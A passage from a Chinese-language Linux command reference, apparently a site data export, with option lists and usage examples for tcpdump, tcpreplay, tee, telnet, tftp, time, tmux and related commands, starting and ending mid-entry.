\n\n```shell\n-a：尝试将网络和广播地址转换成名称；\n-c<数据包数目>：收到指定的数据包数目后，就停止进行倾倒操作；\n-d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；\n-dd：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；\n-ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；\n-e：在每列倾倒资料上显示连接层级的文件头；\n-f：用数字显示网际网络地址；\n-F<表达文件>：指定内含表达方式的文件；\n-i<网络界面>：使用指定的网络截面送出数据包；\n-l：使用标准输出列的缓冲区；\n-n：不把主机的网络地址转换成名字；\n-N：不列出域名；\n-O：不将数据包编码最佳化；\n-p：不让网络界面进入混杂模式；\n-q ：快速输出，仅列出少数的传输协议信息；\n-r<数据包文件>：从指定的文件读取数据包数据；\n-s<数据包大小>：设置每个数据包的大小；\n-S：用绝对而非相对数值列出TCP关联数；\n-t：在每列倾倒资料上不显示时间戳记；\n-tt： 在每列倾倒资料上显示未经格式化的时间戳记；\n-T<数据包类型>：强制将表达方式所指定的数据包转译成设置的数据包类型；\n-v：详细显示指令执行过程；\n-vv：更详细显示指令执行过程；\n-x：用十六进制字码列出数据包资料；\n-w<数据包文件>：把数据包数据写入指定的文件。\n```\n\n###  实例 \n\n **直接启动tcpdump将监视第一个网络接口上所有流过的数据包** \n\n```shell\ntcpdump\n```\n\n **监视指定网络接口的数据包** \n\n```shell\ntcpdump -i eth1\n```\n\n如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。\n\n **监视指定主机的数据包** \n\n打印所有进入或离开sundown的数据包。\n\n```shell\ntcpdump host sundown\n```\n\n也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包\n\n```shell\ntcpdump host 210.27.48.1\n```\n\n打印helios 与 hot 或者与 ace 之间通信的数据包\n\n```shell\ntcpdump host helios and \\( hot or ace \\)\n```\n\n截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信\n\n```shell\ntcpdump host 210.27.48.1 and \\ (210.27.48.2 or 210.27.48.3 \\)\n```\n\n打印ace与任何其他主机之间通信的IP 数据包, 但不包括与helios之间的数据包.\n\n```shell\ntcpdump ip host ace and not helios\n```\n\n如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：\n\n```shell\ntcpdump ip host 210.27.48.1 and ! 210.27.48.2\n```\n\n抓取eth0网卡上的包，使用:\n\n```shell\nsudo tcpdump -i eth0\n```\n\n截获主机hostname发送的所有数据\n\n```shell\ntcpdump -i eth0 src host hostname\n```\n\n监视所有送到主机hostname的数据包\n\n```shell\ntcpdump -i eth0 dst host hostname\n```\n\n **监视指定主机和端口的数据包** \n\n如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令\n\n```shell\ntcpdump tcp port 23 and host 210.27.48.1\n```\n\n对本机的udp 123 端口进行监视 123 为ntp的服务端口\n\n```shell\ntcpdump udp port 123\n```\n\n **监视指定网络的数据包** \n\n打印本地主机与Berkeley网络上的主机之间的所有通信数据包\n\n```shell\ntcpdump net ucb-ether\n```\n\nucb-ether此处可理解为“Berkeley网络”的网络地址，此表达式最原始的含义可表达为：打印网络地址为ucb-ether的所有数据包\n\n打印所有通过网关snup的ftp数据包\n\n```shell\ntcpdump 'gateway snup and (port ftp or ftp-data)'\n```\n\n注意：表达式被单引号括起来了，这可以防止shell对其中的括号进行错误解析\n\n打印所有源地址或目标地址是本地主机的IP数据包\n\n```shell\ntcpdump ip and not net localnet\n```\n\n如果本地网络通过网关连到了另一网络，则另一网络并不能算作本地网络。\n\n抓取80端口的HTTP报文，以文本形式展示：\n\n```shell\nsudo tcpdump -i any port 80 -A\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tcpdump"]},{"title":"【Linux 命令】tcpreplay","url":"/linux-command/tcpreplay/","content":"\n将PCAP包重新发送，用于性能或者功能测试\n\n## 补充说明\n\n简单的说， **tcpreplay** 是一种pcap包的重放工具，它可以将用ethreal、wireshark工具抓下来的包原样或经过任意修改后重放回去。它允许你对报文做任意的修改（主要是指对2层、3层、4层报文头），指定重放报文的速度等，这样tcpreplay就可以用来复现抓包的情景以定位bug，以极快的速度重放从而实现压力测试。\n\n###  选项\n\n```shell\n-A \"<args>\" 在使用 tcpdump 风格打印输出信息时，同时再调用tcpdump中的参数， 默认已经带有“-n,-l”，所以一般看到的都是ip地址，而没有主机名的打印，注意这个是在tcpreplay使用了-v参数时才能使用，不带-v不会报错，但是没有实际意义。格式：-vA “nnt”表示以tcpdump风格输出报文信息，并且不打印时间戳、主机名、端口服务名称。注意不要使用-c参数来指定打印的数据报文的个数，这样发送出去的报文也会变少。\n-c <cachefile> 双网卡回放报文必选参数，后面紧跟cache文件名，该文件为tcpprep根据对应的pcap文件构造出来。 \n-D 把应用层的数据，使用dump mode写入到指定文件中去，和-w、-W 参数一起使用。 \n-e <ip1:ip2> 指定端点的ip，即把发送报文的和接收的报文的ip都修改称对应的参数值中指定的ip，但是这样发送的出的报文不会区分client和server。。 \n-f <configfile> 指定配置文件。\n-F 在发送报文时，自动纠正错误的校验和。对测试DUT的校验和检验。\n-h 显示帮助文件。 \n-i <nic> 双网卡回放报文必选参数，指定主接口。\n-I <mac> 重写主网卡发送出报文的目的MAC地址。 \n-j <nic> 双网卡回放报文必选参数，指定从接口。\n-J <mac> 重写从网卡发送出报文的目的MAC地址。 \n-k <mac> 重写主网卡发送报文的源MAC地址。 \n-K <mac> 重写从网卡发送报文的源MAC地址。\n-l <loop> 指定循环的次数。\n-L <limit> 指定最大的发包数量。可以在确认连接的调试时使用。 \n-m <multiple> 指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。 加大发送的速率后，对于DUT可能意味着有更多的并发连接和连接数，特别是对于BT报文的重放， 因为连接的超时是固定的，如果速率增大的话， 留在session表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。\n-M 表示不发送“火星”的ip报文，man文件中的定义是 0/8、172/8、 255/8。\n-n 在使用-S参数，不对混杂模式进行侦听。\n-N <CIDR1:CIDR2,...> 通过伪造的NAT，重写IP地址。这个参数应该有很重要的应用，目前没有测试使用。\n-O 没有测试使用。\n-p <packetrate> 指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。\n-P 表示在输出信息中打印PID的信息，用于单用户或单帐户模式下暂停和重启程序。\n-r <rate> 指定发送的速率。目前-m/-r/-p这3个参数的相互关系。\n-R 让网卡极限速度发数据包。 \n-t <mtu> 指定MTU，标准的10/100M网卡的默认值是1500。 \n-T Truncate packets > 截去报文中MTU大于标准值的部分再发送出去，默认是不发送，skip掉。\n-v 每发送一个报文都以 tcpdump 的风格打印出对应的信息。\n-V 查看版本号。\n-w <file> 将主网卡发送的报文写入一个文件中，参数后紧跟文件名。\n```\n\n###  实例\n\n **1、重放在客户端 ftp 连接的报文 ** \n\na、在客户端使用 ethereal 抓包，存为 ftp.pcap 文件。\n\nb、 将 ftp.pcap 文件进行 tcpprep 操作，制作 cache 文件。\n\n```shell\n[root@A ~]# tcpprep -an client -i ftp.pcap -o ftp.cache –v \n```\n\nc、 将 DUT 设备的两个接口和 PC 的两个接口使用网线连接，使用 tcpreplay 重 放报文。注意防火墙的配置为网桥（透明）模式。 \n\n```shell\n[root@A ~]# tcpreplay -c ftp.cache -i eth0 -j eth1 ftp.pcap -R –v \n```\n\n-R 参数表示全速发送，-v 显示打印信息。 \n\n **2、重放在客户端 BT 连接的报文 ** \n\na、在实验室 BT 下载一些台湾的娱乐节目和热门的大片，使用 ethereal 抓包， 存为 bt.pcap 文件。注意 pcap 文件大小的控制，对 pc 的内存要求比较高，我保 存了一个 600 多 M 的 pcap 文件用了 40 多分钟，大家有需要可以直接从实验室 copy。 \n\nb、将 bt.pcap 文件进行 tcpprep 操作，制作 cache 文件。\n\n```shell\n [root@A ~]# tcpprep -an client -i bt.pcap -o bt.cache -C \"100M BT Packet\" –v\n```\n\n制作 cache 文件，在 cache 文件中写入“100M BT Packet”的注释。 \n\nc、使用 tcpreplay 重放报文。 \n\n```shell\n[root@A ~]# tcpreplay -c bt.cache -i eth0 -j eth1 bt.pcap -v –R \n```\n\n **3、重放 tftp 服务器上抓到的报文 ** \n\na、在 tftp 服务器上使用 ethereal 抓包，存为 tftp.pcap 文件。 \n\nb、将 pcap 文件进行 tcpprep 的操作，制作 cache 文件。 \n\n```shell\n[root@A ~]# tcpprep -an server -i tftp.pcap -o tftp.cache –v \n```\n\n注意：我在测试的时候犯了一个错误，使用 DUT 的 tftp 升级来做实验，同时穿 过 DUT 重放报文，结果在网卡发送报文的后，DUT 的 mac 地址做了的回应，导致 交互过程没有穿过 DUT，这个问题比较搞笑，上午弄了半天才发现原因，开始还 以为 udp 的连接不能重放。 \n\nc、使用 tcpreplay 重放报文。 \n\n```shell\n[root@A ~]# tcpreplay -c tftp.cache -i eth0 -j eth1 tftp.pcap –v\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tcpreplay"]},{"title":"【Linux 命令】tee","url":"/linux-command/tee/","content":"\n从标准输入读取数据并重定向到标准输出和文件。\n\n## 概要\n\n```shell\ntee [OPTION]... [FILE]...\n```\n\n## 主要用途\n\n- 需要同时查看数据内容并输出到文件时使用。\n\n## 参数\n\nFILE（可选）：要输出的文件，可以为一或多个。\n\n## 选项 \n\n```shell\n长选项与短选项等价\n\n-a, --append               追加到文件中而不是覆盖。\n-i, --ignore-interrupts    忽略中断信号（Ctrl+c中断操作无效）。\n-p                         诊断写入非管道的错误。\n--output-error[=MODE]      设置写错误时的行为，请查看下方的MODE部分。\n--help                     显示帮助信息并退出。\n--version                  显示版本信息并退出。\n\nMODE决定了当出现写错误时的输出行为，可用的MODE如下：\n\n'warn'           当写入到任何输出报错时诊断。\n'warn-nopipe'    当写入到任何输出（而不是管道）报错时诊断。\n'exit'           当写入到任何输出报错时退出。\n'exit-nopipe'    当写入到任何输出（而不是管道）报错时退出。\n\n-p选项的指定的默认MODE为'warn-nopipe'。\n当'--output-error'没有在选项中时，默认的操作是当写入到管道报错时立刻退出，诊断错误信息并写入到非管道输出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子 \n\n```shell\n# 将进程信息通过管道输出到标准输出（终端）并覆盖写入到文件中。\nps -ef |tee info_a.log info_b.log\n\n# 将进程信息通过管道输出到标准输出（终端）并追加写入到文件中。\nps -ef |tee -a info_a.log info_b.log\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 tee`或`info coreutils 'tee invocation'`。\n2. 存在缓存机制，每1024个字节将输出一次。若从管道接收输入数据，应该是缓冲区满，才将数据转存到指定的文件中。若文件内容不到1024个字节，则接收从标准输入设备读入的数据后，将刷新一次缓冲区，并转存数据到指定文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tee"]},{"title":"【Linux 命令】telint","url":"/linux-command/telint/","content":"\n切换当前正在运行系统的运行等级\n\n## 补充说明\n\n**telint命令** 用于切换当前正在运行的Linux系统的运行等级。\n\n###  语法\n\n```shell\ntelint(选项)(参数)\n```\n\n###  选项\n\n```shell\n-t：指定等待的秒数。\n```\n\n###  参数\n\n运行等级：指定要切换的运行等级。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","telint"]},{"title":"【Linux 命令】telnet","url":"/linux-command/telnet/","content":"\n登录远程主机和管理(测试ip端口是否连通)\n\n## 补充说明\n\n**telnet命令** 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。\n\n### 语法\n\n```shell\ntelnet(选项)(参数)\n```\n\n### 选项\n\n```shell\n-8：允许使用8位字符资料，包括输入与输出；\n-a：尝试自动登入远端系统；\n-b<主机别名>：使用别名指定远端主机名称；\n-c：不读取用户专属目录里的.telnetrc文件；\n-d：启动排错模式；\n-e<脱离字符>：设置脱离字符；\n-E：滤除脱离字符；\n-f：此参数的效果和指定\"-F\"参数相同；\n-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；\n-k<域名>：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；\n-K：不自动登入远端主机；\n-l<用户名称>：指定要登入远端主机的用户名称；\n-L：允许输出8位字符资料；\n-n<记录文件>：指定文件记录相关信息；\n-r：使用类似rlogin指令的用户界面；\n-S<服务类型>：设置telnet连线所需的ip TOS信息；\n-x：假设主机有支持数据加密的功能，就使用它；\n-X<认证形态>：关闭指定的认证形态。\n```\n\n### 参数\n\n*   远程主机：指定要登录进行管理的远程主机；\n*   端口：指定TELNET协议使用的端口号。\n\n### 实例\n\n```shell\n$ telnet 192.168.2.10\nTrying 192.168.2.10...\nConnected to 192.168.2.10 (192.168.2.10).\nEscape character is '^]'.\n\n    localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)\n\nlogin: root\nPassword:\nLogin incorrect\n```\n\n一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。\n\n```shell\n$ telnet 192.168.188.132\nTrying 192.168.188.132...\ntelnet: connect to address 192.168.188.132: Connection refused\ntelnet: Unable to connect to remote host\n```\n\n处理这种情况方法：\n\n1. 确认ip地址是否正确？\n1. 确认ip地址对应的主机是否已经开机？\n1. 如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）\n1. 如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）\n1. 如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）\n\n**启动telnet服务**\n\n```shell\nservice xinetd restart\n```\n\n配置参数，通常的配置如下：\n\n```shell\nservice telnet\n{\n    disable = no #启用\n    flags = REUSE #socket可重用\n    socket_type = stream #连接方式为TCP\n    wait = no #为每个请求启动一个进程\n    user = root #启动服务的用户为root\n    server = /usr/sbin/in.telnetd #要激活的进程\n    log_on_failure += USERID #登录失败时记录登录用户名\n}\n```\n\n如果要配置允许登录的客户端列表，加入\n```\nonly_from = 192.168.0.2 #只允许192.168.0.2登录\n```\n如果要配置禁止登录的客户端列表，加入\n```\nno_access = 192.168.0.{2,3,4} #禁止192.168.0.2、192.168.0.3、192.168.0.4登录\n```\n如果要设置开放时段，加入\n```\naccess_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P）\n```\n\n如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入\n```\nbind = 192.168.0.2\n```\n\n各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf）\n\n配置端口，修改services文件：\n\n```shell\n# vi /etc/services\n```\n\n找到以下两句\n\n```shell\ntelnet 23/tcp\ntelnet 23/udp\n```\n\n如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。\n\n启动服务：\n```\nservice xinetd restart\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","telnet"]},{"title":"【Linux 命令】tempfile","url":"/linux-command/tempfile/","content":"\nshell中给临时文件命名\n\n## 补充说明\n\n有时候在写Shell脚本的时候需要一些临时存储数据的才做，最适合存储临时文件数据的位置就是`/tmp`，因为该目录中所有的内容在系统重启后就会被清空。下面是两种方法为临时数据生成标准的文件名。\n\n###  tempfile命令\n\n`tempfile命令`只有在基于Debian的发行版中才默认自带，比如Ubuntu，其他发行版没有这个命令。\n\n用tempfile命令为一个临时文件命名：\n\n```shell\ntemp_file_name=$(tempfile)\n```\n\n用一个加带了随机数的文件名作为临时文件命名：\n\n```shell\ntemp_file_name=\"/tmp/file_$RANDOM\"\n```\n\n$RANDOM是一个返回随机数的环境变量。\n\n###  $$变量\n\n如果没有tempfile命令的Linux发行版，也可以使用自己的临时文件名：\n\n```shell\ntemp_file_name=\"/tmp/file.$\"\n```\n\n`$$`是系统预定义变量，显示当前所在进程的进程号，用`.$$`作为添加的后缀会被扩展成当前运行脚本的进程id。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tempfile"]},{"title":"【Linux 命令】test","url":"/linux-command/test/","content":"\n执行条件表达式。\n\n## 概要\n\n```shell\ntest [expr]\n```\n\n## 主要用途\n\n- 执行条件表达式。\n\n## 参数\n\n### 文件操作符：\n\n```shell\n-a FILE    如果文件存在，则为true。\n-b FILE    如果文件是块特殊的，则为true。\n-c FILE    如果文件是特殊字符，则为true。\n-d FILE    如果文件是目录，则为true。\n-e FILE    如果文件存在，则为true。\n-f FILE    如果文件存在并且是常规文件，则为true。\n-g FILE    如果文件是set-group-id，则为true。\n-h FILE    如果文件是符号链接，则为true。\n-L FILE    如果文件是符号链接，则为true。\n-k FILE    如果文件的粘滞位（sticky）设置了，则为true。\n-p FILE    如果文件是命名管道，则为true。\n-r FILE    如果您可以读取文件，则为true。\n-s FILE    如果文件存在且不为空，则为true。\n-S FILE    如果文件是套接字，则为true。\n-t FD      如果在终端上打开FD，则为True。\n-u FILE    如果文件是set-user-id，则为true。\n-w FILE    如果文件可写，则为true。\n-x FILE    如果您可以执行文件，则为true。\n-O FILE    如果文件有效地归您所有，则为true。\n-G FILE    如果文件有效地归您的组所有，则为true。\n-N FILE    如果文件自上次读取以来已被修改，则为true。\n    \nFILE1 -nt FILE2    根据修改日期，如果 file1 比 file2 新，则为true。\nFILE1 -ot FILE2    根据修改日期，如果 file1 比 file2 旧，则为true。\nFILE1 -ef FILE2    如果 file1 为 file2 的硬链接，则为true。\n```    \n### 字符串运算符：\n\n```shell\n-z STRING              如果字符串为空，则为true。\n-n STRING              如果字符串不为空，则为true。\nSTRING                 如果字符串不为空，则为true。\nSTRING1 = STRING2      如果字符串相等，则为true。\nSTRING1 ！= STRING2    如果字符串不相等，则为true。\nSTRING1 < STRING2      如果 STRING1 的字典排序在 STRING2 之前，则为true。\nSTRING1 > STRING2      如果 STRING1 在字典排序在 STRING2 之后，则为true。\n```\n\n### 其他运算符：\n\n```shell\n-o OPTION         如果启用了shell选项OPTION，则为true。\n-v VAR            如果设置了shell变量VAR，则为true。\n-R VAR            如果设置了shell变量VAR并且是变量引用，则为true。\n！EXPR            如果expr为假，则为true。\nEXPR1 -a EXPR2    如果expr1和expr2都为true，则为true。\nEXPR1 -o EXPR2    如果expr1或expr2为true，则为true。\narg1 OP arg2      算术表达式测试； OP是 -eq，-ne，-lt，-le，-gt，-ge 中的一个；算术表达式为真时返回true。\n```\n\n## 返回值\n\n如果表达式执行结果为成功时返回0，当表达式执行结果为失败或给出非法参数时返回1。\n\n## 例子\n\n```shell\n# 执行条件表达式并显示返回值。\n[root@pc root]$ test ! \"abc\" == 123; echo $?\n0\n\n# 等价形式，注意：方括号 [ 后面的空格以及方括号 ] 前面的空格。\n[root@pc root]$ [ ! \"abc\" == 123 ]; echo $?\n0\n\n[root@pc root]$ [[ ! \"abc\" == 123 ]]; echo $?\n0\n```\n\n\n### 注意\n\n1. 该命令等价于 `[`。\n2. 编写 bash 条件表达式可用内建命令 `test`， `[` ，组合命令 `[[`；\n  > - 关于条件表达式可以查看[这里](http://www.gnu.org/software/bash/manual/html_node/Bash-Conditional-Expressions.html#Bash-Conditional-Expressions)；\n  > - 关于内建命令的索引可以查看[这里](http://www.gnu.org/software/bash/manual/html_node/Builtin-Index.html#Builtin-Index)；\n  > - 关于组合命令的索引可以查看[这里](http://www.gnu.org/software/bash/manual/html_node/Reserved-Word-Index.html#Reserved-Word-Index)\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","test"]},{"title":"【Linux 命令】tftp","url":"/linux-command/tftp/","content":"\n在本机和tftp服务器之间使用TFTP协议传输文件\n\n## 补充说明\n\n**tftp命令** 用在本机和tftp服务器之间使用TFTP协议传输文件。\n\nTFTP是用来下载远程文件的最简单网络协议，它其于UDP协议而实现。嵌入式linux的tftp开发环境包括两个方面：一是linux服务器端的tftp-server支持，二是嵌入式目标系统的tftp-client支持。因为u-boot本身内置支持tftp-client，所以嵌入式目标系统端就不用配置了。下面就详细介绍一下linux服务器端tftp-server的配置。\n\n###  语法\n\n```shell\ntftp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：指定与tftp服务器连接成功后，立即要执行的指令；\n-m：指定文件传输模式。可以是ASCII或者Binary；\n-v：显示指令详细执行过程；\n-V：显示指令版本信息。\n```\n\n###  参数\n\n主机：指定tftp要联机的tftp服务器的ip地址或主机名。\n\n###  实例\n\n **1、安装tftp服务器** \n\n需要安装xinetd、tftp和tftp-server 3个软件\n\n如果能上网，通过yum安装：\n\n```shell\nyum install xinetd\nyum install tftp\nyum install tftp-server\n```\n\n如果不能上网，可以直接安装提供的rpm包：\n\n```shell\nrpm -ivh xinetd-2.3.14-18.fc9.i386.rpm\nrpm -ivh tftp-0.48-3.fc9.i386.rpm\nrpm -ivh tftp-server-0.48-3.fc9.i386.rpm\n```\n\n **2、配置tftp服务器** \n\n修改/etc/xinetd.d/tftp文件，将其中的disable=yes改为disable=no。主要是设置TFTP服务器的根目录，开启服务。修改后的文件如下：\n\n```shell\nservice tftp\n{\n       socket_type           =dgram\n       protocol              =udp\n       wait                  =yes\n       user                  =root\n       server                =/usr/sbin/in.tftpd\n       server_args           =-s  /home/mike/tftpboot -c\n       disable               =no\n       per_source            =11\n       cps                   =100 2\n       flags                 =IPv4\n}\n```\n\n说明：修改项`server_args= -s <path> -c`，其中<path>处可以改为你的tftp-server的根目录，参数-s指定chroot，-c指定了可以创建文件。\n\n **3、启动tftp服务器并关闭防火墙** \n\n```shell\n/etc/init.d/iptables stop        # 关闭防火墙\nsudo /sbin/service xinetd start\n或\nservice xinetd restart\n/etc/init.d/xinetd start\n```\n\n看到启动[OK]就可以了\n\n4、查看tftp服务是否开启\n\n```shell\nnetstat -a | grep tftp\n```\n\n显示结果为`udp 0 0 *:tftp *:*`表明服务已经开启，就表明tftp配置成功了。\n\n **5、tftp使用** \n\n复制一个文件到tftp服务器目录，然后在主机启动tftp软件，进行简单测试。\n\n```shell\ntftp 192.168.1.2\ntftp>get <download file> \n\ntftp>put <upload file>\ntftp>q\n```\n\n **6、tftp命令用法如下** \n\n```shell\ntftp your-ip-address\n```\n\n进入TFTP操作：\n\n*   connect：连接到远程tftp服务器\n*   mode：文件传输模式\n*   put：上传文件\n*   get：下载文件\n*   quit：退出\n*   verbose：显示详细的处理信息\n*   tarce：显示包路径\n*   status：显示当前状态信息\n*   binary：二进制传输模式\n*   ascii：ascii 传送模式\n*   rexmt：设置包传输的超时时间\n*   timeout：设置重传的超时时间\n*   help：帮助信息\n*   ? ：帮助信息\n\n **7、如果老是出现“AVC Denial, click icon to view”的错误，并不能传输文件，需要作如下修改** \n\n修改`/etc/sysconfig/selinux`,将SELINUX设定为disable，使用命令`setenforce 0`让selinux配置文件生效。\n\n **8、Busybox中tftp命令的用法** \n\n命令格式为：\n\n```shell\ntftp [option] ... host [port]\n```\n\n如果要下载或上传文件的话是一定要用这些option的。\n\n```shell\n-g 表示下载文件 (get)\n-p 表示上传文件 (put)\n-l 表示本地文件名 (local file)\n-r 表示远程主机的文件名 (remote file)\n```\n\n例如，要从远程主机192.168.1.2上下载 embedexpert，则应输入以下命令\n\n```shell\ntftp -g -r embedexpert 192.168.1.2\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tftp"]},{"title":"【Linux 命令】time","url":"/linux-command/time/","content":"\n统计给定命令所花费的总时间\n\n## 补充说明\n\n**time命令** 用于统计给定命令所花费的总时间。\n\n###  语法\n\n```shell\ntime(参数)\n```\n\n###  参数\n\n指令：指定需要运行的额指令及其参数。\n\n###  实例\n\n当测试一个程序或比较不同算法时，执行时间是非常重要的，一个好的算法应该是用时最短的。所有类UNIX系统都包含time命令，使用这个命令可以统计时间消耗。例如：\n\n```shell\n[root@localhost ~]# time ls\nanaconda-ks.cfg  install.log  install.log.syslog  satools  text\n\nreal    0m0.009s\nuser    0m0.002s\nsys     0m0.007s\n```\n\n输出的信息分别显示了该命令所花费的real时间、user时间和sys时间。\n\n*   real时间是指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。\n*   user时间是指进程花费在用户模式中的CPU时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。\n*   sys时间是指花费在内核模式中的CPU时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的CPU时间。\n\nshell内建也有一个time命令，当运行time时候是调用的系统内建命令，应为系统内建的功能有限，所以需要时间其他功能需要使用time命令可执行二进制文件`/usr/bin/time`。\n\n使用`-o`选项将执行时间写入到文件中：\n\n```shell\n/usr/bin/time -o outfile.txt ls\n```\n\n使用`-a`选项追加信息：\n\n```shell\n/usr/bin/time -a -o outfile.txt ls\n```\n\n使用`-f`选项格式化时间输出：\n\n```shell\n/usr/bin/time -f \"time: %U\" ls\n```\n\n`-f`选项后的参数：\n\n参数 | 描述\n--- | ---\n`%E` | real时间，显示格式为[小时:]分钟:秒\n`%U` | user时间。\n`%S` | sys时间。\n`%C` | 进行计时的命令名称和命令行参数。\n`%D` | 进程非共享数据区域，以KB为单位。\n`%x` | 命令退出状态。\n`%k` | 进程接收到的信号数量。\n`%w` | 进程被交换出主存的次数。\n`%Z` | 系统的页面大小，这是一个系统常量，不用系统中常量值也不同。\n`%P` | 进程所获取的CPU时间百分百，这个值等于 `user+system` 时间除以总共的运行时间。\n`%K` | 进程的平均总内存使用量（data+stack+text），单位是 `KB`。\n`%w` | 进程主动进行上下文切换的次数，例如等待I/O操作完成。\n`%c` | 进程被迫进行上下文切换的次数（由于时间片到期）。\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","time"]},{"title":"【Linux 命令】times","url":"/linux-command/times/","content":"\n显示进程累计时间。\n\n## 主要用途\n\n- 打印出shell及其子进程累计使用的用户时间和系统时间。\n\n## 返回值\n\n总是返回成功。\n\n## 例子\n\n```shell\n# 执行命令\ntimes\n# 返回结果\n0m0.037s 0m0.009s\n0m0.010s 0m0.024s\n# 根据times(2)的man手册，对应关系如下：\n# 用户时间        | 系统时间\n# 子进程的用户时间 | 子进程的系统时间\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","times"]},{"title":"【Linux 命令】tload","url":"/linux-command/tload/","content":"\n显示系统负载状况\n\n## 补充说明\n\n**tload命令** 以图形化的方式输出当前系统的平均负载到指定的终端。假设不给予终端机编号，则会在执行tload指令的终端机显示负载情形。\n\n###  语法\n\n```shell\ntload(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s：指定闲时的刻度；\n-d：指定间隔的时间（秒）。\n```\n\n###  参数\n\n终端：指定显示信息的终端设备文件。\n\n###  实例\n\n使用tload命令查看系统负载情况：\n\n```shell\ntload -d 1\n0.08, 0.02,0.01\n0.04, 0.01, 0.00\n0.04, 0.01, 0.00\n0.04, 0.01,0.00\n0.06, 0.02, 0.00\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tload"]},{"title":"【Linux 命令】tmux","url":"/linux-command/tmux/","content":"\nTmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权\n\n## 补充说明\n\n使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机；\n\n## 功能\n\n-  提供了强劲的、易于使用的命令行界面。\n-  可横向和纵向分割窗口。\n-  窗格可以自由移动和调整大小，或直接利用四个预设布局之一。\n-  支持 UTF-8 编码及 256 色终端。\n-  可在多个缓冲区进行复制和粘贴。\n-  可通过交互式菜单来选择窗口、会话及客户端。\n-  支持跨窗口搜索。\n-  支持自动及手动锁定窗口。\n\n## 安装\n\n```shell\n# 在 Mac OS 中，通过 brew 安装\nbrew install tmux\n# ubuntu版本下直接apt-get安装\nsudo apt-get install tmux\n# centos7版本下直接yum安装\nyum install -y tmux\n\n# centos6版本需要编译安装\nyum install libevent libevent-devel ncurses-devel\ntar -zvxf tmux-2.3.tar.gz # (提前下载：wget https://github.com/tmux/tmux/releases/download/2.3/tmux-2.3.tar.gz)\ncd tmux-2.3\n./configure\nmake && make install\n```\n\n## 快捷键使用说明\n\n<table class=\"table-view log-set-param\">\n<tbody>\n<tr>\n<td colspan=\"2\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>Ctrl+b</div>\n</td>\n<td>\n  <div>激活控制台；此时以下按键生效</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"9\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>系统操作</div>\n</td>\n<td>\n  <div>?</div>\n</td>\n<td>\n  <div>列出所有快捷键；按q返回</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>d</div>\n</td>\n<td>\n  <div>脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>D</div>\n</td>\n<td>\n  